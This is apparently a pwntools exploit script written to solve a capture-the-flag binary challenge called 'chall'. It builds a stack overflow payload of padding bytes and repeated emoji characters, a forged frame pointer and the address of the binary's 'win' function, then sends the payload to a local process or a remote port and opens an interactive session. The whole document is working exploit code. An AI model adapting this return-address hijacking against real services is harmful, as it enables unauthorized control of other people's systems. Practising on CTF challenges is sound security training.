#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x401220

        c
        ''')
        sleep(1)


if args.REMOTE:
    # p = remote('ctf.msec.cloud-ip.cc', 1005)
    p = remote('0', 1337)

else:
    p = process([exe.path])

GDB()

emoji = ("🔥"*67)


load = flat(
    b'\0'*4,
    emoji,
    # b'\0'*0x110,
    0x404441,
    exe.sym.win + 8
)

# # socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"python3 wrapper.py"
# target = load[::-1].decode('latin-1')
# starget = load.decode('latin-1')

sl(load)
# sl("A")
p.interactive()

